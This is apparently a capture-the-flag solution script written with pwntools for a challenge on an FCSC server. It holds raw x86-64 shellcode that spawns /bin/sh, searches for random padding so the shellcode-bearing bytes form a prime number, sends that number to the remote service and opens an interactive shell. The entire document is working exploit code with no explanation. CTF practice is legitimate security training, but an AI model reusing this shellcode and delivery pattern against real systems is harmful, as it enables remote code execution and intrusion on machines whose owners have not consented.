from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes
from Crypto.Math.Primality import miller_rabin_test, PROBABLY_PRIME

REMOTE = "chall.fcsc.fr"
PORT = 2100

shellcode = bytes([
  0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54,
  0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
])

def search_payload():
    r = random.Random()
    print("Starting thread.")
    while True :
        candidate = shellcode + r.randbytes((1516 - len(shellcode) * 8) // 8)
        N = bytes_to_long(candidate)
        assert(len(candidate) == len(long_to_bytes(N)))
        if miller_rabin_test(N, 42) == PROBABLY_PRIME :
            print(N)
            return N

N = search_payload()

long_to_bytes(N)

r = remote(REMOTE, PORT)

r.sendline(str(N).encode())
r.interactive()